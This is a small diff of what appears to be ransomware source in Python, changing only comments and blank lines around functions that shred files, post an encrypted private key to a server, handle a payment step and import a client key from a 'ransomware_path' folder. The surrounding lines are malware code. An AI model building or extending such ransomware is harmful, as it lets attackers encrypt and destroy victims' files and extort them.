@@ -94,8 +94,7 @@ def shred(file_name,  passes=1):
 
 
 def send_to_server_encrypted_private_key(id, private_encrypted_key):
-    
-    # do something with id later 
+    #TODO something with id later 
     try:
         ret = requests.post(server_address, data=private_encrypted_key)
     except Exception as e:
@@ -112,8 +111,6 @@ def payment():
 
 
 def menu():
-
-    # import the private key
     print("{}Importing the encrypted client private key".format(WHITE))
     try:
         with open(ransomware_path + '/encrypted_client_private_key.key', 'rb') as f:
